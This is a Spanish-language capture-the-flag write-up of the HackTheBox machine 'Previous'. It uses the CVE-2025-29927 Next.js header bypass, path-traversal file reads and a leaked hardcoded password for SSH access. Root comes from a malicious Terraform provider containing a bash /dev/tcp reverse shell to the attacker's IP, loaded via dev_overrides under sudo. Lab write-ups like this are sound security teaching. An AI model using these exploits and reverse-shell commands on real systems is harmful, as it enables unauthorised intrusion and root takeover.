---
title: Previous - Medium (HTB)
permalink: /Previous-HTB-Writeup/
tags:
  - Linux
  - Medium
  - "CVE-2025–29927"
  - "Next.js"
  - "Local File Inclusion"
  - "Credentials Leakage"
  - "Sudoers"
  - "Terraform"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Previous - Medium (HTB)
seo_description: Explota CVE-2025–29927, LFI, enumera un proyecto en Next.js y explota Terraform para vencer Previous.
excerpt: Explota CVE-2025–29927, LFI, enumera un proyecto en Next.js y explota Terraform para vencer Previous.
header:
  overlay_image: /assets/images/headers/previous-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/previous-hackthebox.jpg
---
![image-center](/assets/images/posts/previous-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2025–29927 - `Next.js` Authorization Bypass, Local File Inclusion + `Next.js` Project Enumeration, Credentials Leakage, Abusing Sudoers Privileges - `terraform` Local Provider [Privilege Escalation]
{: .notice--primary}

# Introducción

Previous es una máquina Linux de dificultad `Medium` en HackTheBox donde debemos vulnerar un sitio web desarrollado con la tecnología `Next.js`, en el cual está presenta la vulnerabilidad CVE-2025–29927 que nos permitirá alcanzar una ruta protegida. Posteriormente, combinaremos la inclusión de archivos locales (`LFI`) y la enumeración de la estructura de un proyecto `Next.js`, donde obtendremos credenciales para ganar acceso al sistema.

La escalada de privilegios es posible a través de una implementación insegura de la herramienta `terraform`, donde utilizando un componente malicioso propio haremos que el sistema ejecute comandos con privilegios elevados.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.83                          
PING 10.10.11.83 (10.10.11.83): 56 data bytes
64 bytes from 10.10.11.83: icmp_seq=0 ttl=63 time=279.667 ms

--- 10.10.11.83 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 279.667/279.667/279.667/0.000 ms
~~~


## Port Scanning 

Comenzaremos lanzando un escaneo de puertos abiertos el cual se encargará de identificar los servicios expuestos en la máquina víctima. Inicialmente, el escaneo lo haremos a través del protocolo TCP/IPv4

``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.83 -oG openPorts

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 20:08 -0300
Nmap scan report for 10.10.11.83
Host is up (0.19s latency).
Not shown: 49078 closed tcp ports (reset), 16455 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.72 seconds
```

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Realizaremos un segundo escaneo más específico, dirigido a intentar identificar la versión y los servicios que se ejecutan en cada puerto

~~~ bash
nmap -p 22,80 -sVC 10.10.11.83 -oN services

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 20:10 -0300
Nmap scan report for 10.10.11.83
Host is up (0.45s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.26 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Solamente vemos dos servicios, `ssh` y `http`, donde sus respectivas versiones no parecen poseer vulnerabilidades explotables en este escenario.

El servidor web nos intenta aplicar una redirección hacia `previous.htb`, contemplaremos este nombre de dominio en nuestro archivo `/etc/hosts` añadiendo una nueva entrada.

De esta forma podremos aplicar resoluciones DNS correctamente hacia el dominio, pasando por su dirección IP, la cual no es pública

``` bash
echo '10.10.11.83 previous.htb' | sudo tee -a /etc/hosts

10.10.11.83 previous.htb
```


## Web Enumeration

Antes de visitar la web, opcionalmente podemos lanzar un escaneo preliminar de tecnologías web. 

De esta forma conoceremos un poco más de información de las tecnologías que el servidor emplea para mostrar el contenido, ya sea un CMS, lenguajes de programación, etc.

``` bash
whatweb http://previous.htb

http://previous.htb [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.83], Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]
```

En este caso el servidor web parece usar `next.js`, además de que es visible una dirección de correo electrónico que no parece ser genérica.

> `Next.js` es un marco de trabajo basado en `React` para crear aplicaciones web full-stack.
{: .notice--info}

Al navegar hasta `previous.htb`, la web principal que vemos es la siguiente

![image-center](/assets/images/posts/previous-1-hackthebox.png)
{: .align-center}

Al hacer clic en algún botón del centro, el servidor nos llevará a la siguiente página, donde vemos que por la URL parece haber una API en el `backend`.

> Una API (Interfaz de Programación de Aplicaciones) es un conjunto de reglas y protocolos que permite a diferentes programas de software comunicarse e intercambiar datos de forma estandarizada.
{: .notice--info}

![image-center](/assets/images/posts/previous-2-hackthebox.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## CVE-2025–29927 - `Next.js` Authorization Bypass

Esta vulnerabilidad permite omitir la autorización en `Next.js` a partir de las versiones `1.11.4` y antes de las versiones `12.3.5`, `13.5.9`, `14.2.25` y `15.2.3`.

Un atacante puede utilizar una cabecera especial que permite eludir el mecanismo de autorización y/o autenticación que implementa un `middleware` en `Next.js`, lo que permite acceso a rutas no autorizadas

### Understanding Vulnerability

`Next.js` usa un `middleware` para aplicar políticas de seguridad, como la autenticación y la autorización antes de enrutar las solicitudes. 

Para evitar bucles infinitos durante los redireccionamientos internos o el renderizado del lado del servidor (`SSR`), incluye una cabecera especial `x-middleware-subrequest` en las solicitudes internas.

El fallo se debe a una confianza indebida en la cabecera `x-middleware-subrequest`, cuyo objetivo es evitar bucles infinitos de `middleware`. 

Un atacante puede falsificar esta cabecera para eludir la lógica del `middleware` y hacerle creer al servidor que se trata de una solicitud interna, y así obtener acceso a rutas protegidas.

> Para las versiones `13.2.0` o superiores, `Next.js` introdujo una profundidad de recursividad máxima para la ejecución del `middleware`. De forma que el `header` tendría el siguiente aspecto, repitiendo partes del `header`. 
{: .notice--info}

``` http
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

### Exploiting

Añadiremos la cabecera a todas las solicitudes que enviemos al servidor a través de `Burpsuite`, esta regla es una solución `dirty` que solamente sirve para este caso concreto

![image-center](/assets/images/posts/previous-3-hackthebox.png)
{: .align-center}

Al intentar visitar la ruta `/docs`, en `Burpsuite` podemos ver cómo se añade la cabecera `X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware`

![image-center](/assets/images/posts/previous-4-hackthebox.png)
{: .align-center}

Veremos que estamos eludiendo el mecanismo del `middleware`, y por ende, alcanzando la ruta protegida `/docs`

![image-center](/assets/images/posts/previous-5-hackthebox.png)
{: .align-center}


## Local File Inclusion

En la barra izquierda podemos ir hacia `/docs/examples`, donde podremos descargar un archivo haciendo clic en en enlace

![image-center](/assets/images/posts/previous-6-hackthebox.png)
{: .align-center}

El servidor hace una llamada a la API hacia `/api/download` para descargar el archivo de ejemplo con el parámetro `example`

![image-center](/assets/images/posts/previous-7-hackthebox.png)
{: .align-center}

Podemos intentar retroceder algunos directorios (`../`) para intentar leer un archivo conocido del sistema, como `/etc/passwd`

``` http
http://previous.htb/api/download?example=../../../../etc/passwd
```

Al procesar la solicitud desde nuestro proxy, podemos ver cómo el servidor carga el contenido del archivo en cuestión

![image-center](/assets/images/posts/previous-8-hackthebox.png)
{: .align-center}

El archivo `/proc/self/environ` puede ayudarnos a ver las variables de entorno actuales

![image-center](/assets/images/posts/previous-9-hackthebox.png)
{: .align-center}

- La variable `PWD` (`Present Working Directory`) nos muestra que estamos en la ruta `/app`


## `Next.js` Project Enumeration

En este punto tenemos una vulnerabilidad que nos permite leer archivos del sistema a través de un endpoint de la API. 

Como la lectura de archivos no supone una vulnerabilidad lo suficientemente crítica como para acceder al servidor (hasta ahora), podemos intentar enumerar los archivos de la web

### Fuzzing

Podemos lanzar un ataque de `fuzzing` para intentar buscar archivos de un proyecto `Next.js`.

> En mi caso he utilizado el siguiente [diccionario](https://github.com/camchenry/wordlists/blob/master/js-3k.txt) dirigido a tecnologías que implementan `javascript` y `typescript`.
{: .notice--warning}

``` bash
ffuf -w js-3k.txt -u 'http://previous.htb/api/download?example=../../../app/FUZZ' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' -t 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?example=../../../app/FUZZ
 :: Wordlist         : FUZZ: /Users/andrees/machines/htb/previous/exploits/fuzz/js-3k.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 10
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

package.json            [Status: 200, Size: 587, Words: 106, Lines: 27, Duration: 604ms]
pages                   [Status: 500, Size: 22, Words: 2, Lines: 1, Duration: 484ms]
public                  [Status: 500, Size: 22, Words: 2, Lines: 1, Duration: 475ms]
node_modules            [Status: 500, Size: 22, Words: 2, Lines: 1, Duration: 613ms]
server.js               [Status: 200, Size: 6009, Words: 80, Lines: 38, Duration: 1228ms]
.env                    [Status: 200, Size: 49, Words: 1, Lines: 2, Duration: 1147ms]
:: Progress: [3000/3000] :: Job [1/1] :: 9 req/sec :: Duration: [0:05:51] :: Errors: 0 ::
```

### Built-in Server - `server.js`

El archivo `server.js` es un script que es utilizado para crear un servidor personalizado, permite manejar lógica de `backend` que `Next.js` no cubre por defecto. 

También puede contener rutas de la API, `middleware`, autenticación o integración con bases de datos

``` bash
http://previous.htb/api/download?example=../../../app/server.js

# Alternativa
http://previous.htb/api/download?example=../../server.js
```

El campo [`destDir`](https://nextjs.org/docs/pages/api-reference/config/next-config-js/distDir) dice dónde se guarda el resultado de construcción de un proyecto (`next build`), por defecto el directorio su nombre es `.next`.

> El directorio `.next` en `Next.js` es una carpeta auto-generada y oculta que contiene los archivos de compilación, optimizaciones, y activos estáticos de tu aplicación.
{: .notice--warning}

![image-center](/assets/images/posts/previous-10-hackthebox.png)
{: .align-center}

### Routes - `routes-manifest.json`

En vez de continuar haciendo `fuzzing`, podemos consultar la estructura general del [directorio `.next`](https://myfirstblog123.hashnode.dev/unlocking-the-secrets-of-the-next-folder-in-nextjs#heading-7-metadata-files-keep-things-organized), donde `routes-manifest.json` mapea las rutas a los archivos correctos

``` bash
curl -s "http://previous.htb/api/download?example=../../../app/.next/routes-manifest.json" -H "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware" | head

{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
```

Al inspeccionar este archivo, encontraremos una ruta hacia la API de autenticación

![image-center](/assets/images/posts/previous-11-hackthebox.png)
{: .align-center}

### `NextAuth.js`

Dentro de la ruta de la API se encuentra un archivo `[...nextauth].js`. Según la [documentación](https://next-auth.js.org/getting-started/example#add-api-route), consiste en un controlador de rutas dinámicas para `NextAuth.js`. 

Por lo que podríamos intentar visitar el siguiente archivo dentro de la ruta `.next`

``` http
http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/\[...nextauth\].js
```


## Credentials Leakage

Al solicitar el archivo `[...nextauth].js`, veremos código `javascript` que hace referencia a la 

``` bash
curl 'http://previous.htb/api/download?example=../../../app/.next/server/pages/api/auth/\[...nextauth\].js' -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' 
  
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();%
```

Podemos utilizar herramientas como [`Beautifier`](https://beautifier.io/) para formatear este código con el fin de que sea un poco más legible.

En este archivo se define la lógica de autenticación, veremos las credenciales para un usuario llamado `jeremy`

``` js
...
<SNIP>
...
authorize: async e => e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? {
	id: "1",
	name: "Jeremy"
	} : null
	})],
...
<SNIP>
...
```

Lógicamente, estas credenciales nos permiten iniciar sesión en la web (`jeremy:MyNameIsJeremyAndILovePancakes`)

![image-center](/assets/images/posts/previous-12-hackthebox.png)
{: .align-center}


## Shell as `jeremy`

Estas credenciales además nos permitirán conectarnos por `ssh` a la máquina víctima

``` bash
ssh jeremy@previous.htb

jeremy@previous.htb's password:
-bash-5.1$ whoami
jeremy
-bash-5.1$ export TERM=xterm # Limpiar la pantalla con Ctrl+C
```

Ya podremos ver la flag del usuario sin privilegios ubicada dentro de `/home/jeremy`

``` bash
-bash-5.1$ cat user.txt 
c6b...
```
<br>


# Escalada de Privilegios
---
## Abusing Sudoers Privileges - `terraform` Local Provider

> `Terraform`, desarrollado por `HashiCorp`, es una herramienta líder de `IaC` (Infraestructura como Código) que permite a las organizaciones definir su infraestructura de forma declarativa, garantizando la consistencia y la automatización.
{: .notice--info}

Al listar los privilegios configurados para el usuario `jeremy`, veremos que podemos ejecutar `terraform` de una forma específica

``` bash
-bash-5.1$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

- `!env_reset` no resetea las variables de entorno, con esta configuración podríamos ejecutar la herramienta definiendo nuestras variables de entorno.

- `env_delete+=PATH` elimina el `PATH` del usuario `jeremy` cuando ejecute la herramienta, lo que evita ataques de `PATH Hijacking`.

- `-chdir\=/opt/examples`: Solamente podemos ejecutar `terraform` bajo la ruta `/opt/examples`.

### Understanding `Terraform` Workflow

`Terraform` permite declarar infraestructura en el formato HCL (`HashiCorp Configuration Language`) dentro de archivos `.tf`. Su flujo de trabajo consiste en tres fases:

- `write`: Crea la infraestructura (`terraform init`).
- `plan`: Obtiene una vista previa de los cambios antes de aplicarlos (`terraform plan`).
- `apply`: Una vez aprobado, ejecuta los cambios propuestos en la planificación (`terraform apply`).

### Attack Vector

Los proveedores de `Terraform` se ejecutan como binarios externos con los mismos permisos del usuario que ejecuta `terraform apply`. 

> Los [proveedores](https://developer.hashicorp.com/terraform/language/providers) de `Terraform` son complementos que le permiten interactuar con API para servicios y plataformas externos.
{: .notice--info}

La configuración del archivo [`main.tf`](https://www.env0.com/blog/terraform-files-and-folder-structure-organizing-infrastructure-as-code) local nos indica la ubicación de un provider personalizado, está registrado en `previous.htb/terraform/examples` y su nombre es `examples`

~~~ bash
-bash-5.1$ cat /opt/examples/main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
~~~

Si un atacante puede ejecutar `Terraform` mediante `sudo` aplicando la lógica de proveedores externos, puede ejecutar binarios de terceros con privilegios elevados.

El `provider` local se encuentra bajo la ruta `/opt/terraform-provider-examples`.

> Sin embargo, no tenemos permisos suficientes para modificar su código, por lo que debemos buscar una vía de explotación un poco más avanzada.
{: .notice--danger}

``` bash
-bash-5.1$ ls -la /opt/terraform-provider-examples
total 48
drwxr-xr-x 3 root root 4096 Aug 21 20:09 .
drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
-rw-r--r-- 1 root root  432 Apr 12  2025 .gitignore
-rw-r--r-- 1 root root  685 Apr 12  2025 .golangci.yml
-rw-r--r-- 1 root root 1318 Aug 21 18:09 go.mod
-rw-r--r-- 1 root root 1800 Apr 12  2025 .goreleaser.yml
-rw-r--r-- 1 root root 8438 Apr 12  2025 go.sum
drwxr-xr-x 3 root root 4096 Aug 21 20:09 internal
-rw-r--r-- 1 root root  558 Apr 12  2025 main.go
-rw-r--r-- 1 root root   83 Apr 12  2025 terraform-registry-manifest.json
```

No todo está perdido, con la configuración de un archivo `.rc` podemos intentar sobrescribir el proveedor `terraform-provider-examples` para cargar un provider local desde otra ruta.

> El archivo [`terraform.rc`](https://developer.hashicorp.com/terraform/cli/config/config-file) es el archivo de configuración de la CLI de `Terraform`, que define los ajustes de la propia interfaz de línea de comandos.
{: .notice--info}

Como la configuración de `sudoers` no elimina las variables de entorno (`!env_reset`), podemos intentar cambiar la ruta del archivo de configuración (`.rc`)

### Exploiting

Haremos referencia hacia un nuevo `provider` local creado por nosotros, el cual ejecutará comandos con los privilegios del usuario `root`.

En mi caso, envié directamente una shell hacia mi IP por el puerto `443`

``` bash
-bash-5.1$ mkdir -p /tmp/.evil-provider
-bash-5.1$ cat > /tmp/.evil-provider/terraform-provider-examples << 'EOF'
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.10.14.11/443 0>&1"
EOF
```

Asignaremos permisos de ejecución a nuestro nuevo provider `terraform-provider-examples`

``` bash
-bash-5.1$ chmod +x /tmp/.evil-provider/terraform-provider-examples
```

Crearemos un archivo `.rc` que contendrá la configuración necesaria para sobrescribir la dirección del registro hacia el `provider` malicioso usando el bloque `dev_overrides`.

El proveedor que creamos está dentro de `/tmp/.evil-provider`, y al ejecutarse enviará una reverse shell

``` bash
-bash-5.1$ cat > /tmp/terraform.rc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/tmp/.evil-provider/"
  }
  direct {}
}
EOF
```


## Root Time

Iniciaremos un listener que se encargue de recibir una conexión por un puerto, en mi caso elegí el `443`

``` bash 
nc -lvnp 443
```

Finalmente, ejecutaremos `terraform` de la forma que nos permite la configuración de `sudo`. 

> Nota cómo definimos la variable `TF_CLI_CONFIG_FILE` para utilizar el archivo de configuración `.rc` que creamos, aunque también puedes usar el comando `export TF_CLI_CONFIG_FILE=/tmp/terraform.rc`.
{: .notice--warning}

``` bash
-bash-5.1$ TF_CLI_CONFIG_FILE=/tmp/terraform.rc sudo terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with
│ published releases.
```

En nuestro listener recibiremos una consola como el usuario `root`

``` bash
nc -lvnp 443
Connection from 10.10.11.83:34750
root@previous:/opt/examples# id
id
uid=0(root) gid=0(root) groups=0(root)
```

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
root@previous:/opt/examples# cat /root/root.txt 
469...
```

Gracias por leer, a continuación te dejo la cita del día.

> From error to error one discovers the entire truth.
> — Sigmund Freud
{: .notice--info}
